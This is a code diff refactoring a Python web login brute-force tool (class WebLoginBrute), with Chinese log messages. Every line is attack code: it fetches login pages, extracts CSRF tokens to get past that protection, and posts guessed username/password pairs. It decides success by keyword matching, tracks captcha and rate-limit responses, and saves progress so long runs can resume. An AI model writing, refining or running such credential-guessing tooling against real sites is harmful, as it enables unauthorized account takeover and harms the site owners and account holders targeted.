@@ -135,44 +135,15 @@ class WebLoginBrute:
     def _try_login(self, username: str, password: str) -> bool:
         if self.success.is_set() or self._shutdown_requested:
             return False
-        # 检查频率限制、对抗级别等可在此扩展
         try:
-            # 1. 获取登录页面，提取token
-            resp = self.http.get(self.config.url)
+            resp = self._get_login_page(username, password)
             if not resp or not resp.text:
                 self.stats.update("other_errors")
                 return False
-            analyze_form_fields(resp.text)
-            token = None
-            if self.config.csrf:
-                token = extract_token(
-                    resp.text, resp.headers.get("Content-Type", ""), self.config.csrf
-                )
-                if not token:
-                    logging.warning(f"未能为 {username}:{password} 提取Token")
-            # 2. 构造登录数据
-            data = {"username": username, "password": password}
-            if self.config.csrf and token:
-                data[self.config.csrf] = token
-            if self.config.login_field and self.config.login_value:
-                data[self.config.login_field] = self.config.login_value
-            # 3. 发送登录请求
+            token = self._extract_token(resp, username, password)
+            data = self._build_login_data(username, password, token)
             resp2 = self.http.post(self.config.action, data=data)
-            # 4. 检查登录结果
-            if self._check_login_success(resp2):
-                logging.info(f"登录成功: {username}:{password}")
-                self.stats.update("successful_attempts")
-                return True
-            # 5. 检查验证码
-            if contains_captcha(resp2.text):
-                self.stats.update("captcha_detected")
-                logging.warning(f"检测到验证码: {username}:{password}")
-            # 6. 记录失败
-            self.stats.update("total_attempts")
-            self.state.add_attempted((username, password))
-            if self.stats.stats["total_attempts"] % 100 == 0:
-                self.state.save_progress(self.stats.get_stats())
-            return False
+            return self._handle_login_response(resp2, username, password)
         except RateLimitError as e:
             logging.error(f"频率限制错误: {e}")
             self.stats.update("rate_limit_errors")
@@ -182,13 +153,51 @@ class WebLoginBrute:
             self.stats.update("other_errors")
             return False
 
-    def _check_login_success(self, response) -> bool:
+    def _get_login_page(self, username, password):
+        resp = self.http.get(self.config.url)
+        analyze_form_fields(resp.text)
+        return resp
+
+    def _extract_token(self, resp, username, password):
+        token = None
+        if self.config.csrf:
+            token = extract_token(
+                resp.text, resp.headers.get("Content-Type", ""), self.config.csrf
+            )
+            if not token:
+                logging.warning(f"未能为 {username}:{password} 提取Token")
+        return token
+
+    def _build_login_data(self, username, password, token):
+        data = {"username": username, "password": password}
+        if self.config.csrf and token:
+            data[self.config.csrf] = token
+        if self.config.login_field and self.config.login_value:
+            data[self.config.login_field] = self.config.login_value
+        return data
+
+    def _handle_login_response(self, resp2, username, password):
+        if self._check_login_success(resp2):
+            logging.info(f"登录成功: {username}:{password}")
+            self.stats.update("successful_attempts")
+            return True
+        if contains_captcha(resp2.text):
+            self.stats.update("captcha_detected")
+            logging.warning(f"检测到验证码: {username}:{password}")
+        self.stats.update("total_attempts")
+        self.state.add_attempted((username, password))
+        if self.stats.stats["total_attempts"] % 100 == 0:
+            self.state.save_progress(self.stats.get_stats())
+        return False
+
+    def _check_login_success(self, response, success_keywords=None, failure_keywords=None) -> bool:
         if not response or not response.text:
             return False
-        # 简单的成功判断逻辑，可根据实际目标调整
+        if success_keywords is None:
+            success_keywords = ["welcome", "dashboard", "logout", "profile", "success"]
+        if failure_keywords is None:
+            failure_keywords = ["invalid", "incorrect", "failed", "error", "login"]
         text = response.text.lower()
-        success_keywords = ["welcome", "dashboard", "logout", "profile", "success"]
-        failure_keywords = ["invalid", "incorrect", "failed", "error", "login"]
         success_count = sum(1 for k in success_keywords if k in text)
         failure_count = sum(1 for k in failure_keywords if k in text)
         return success_count > failure_count
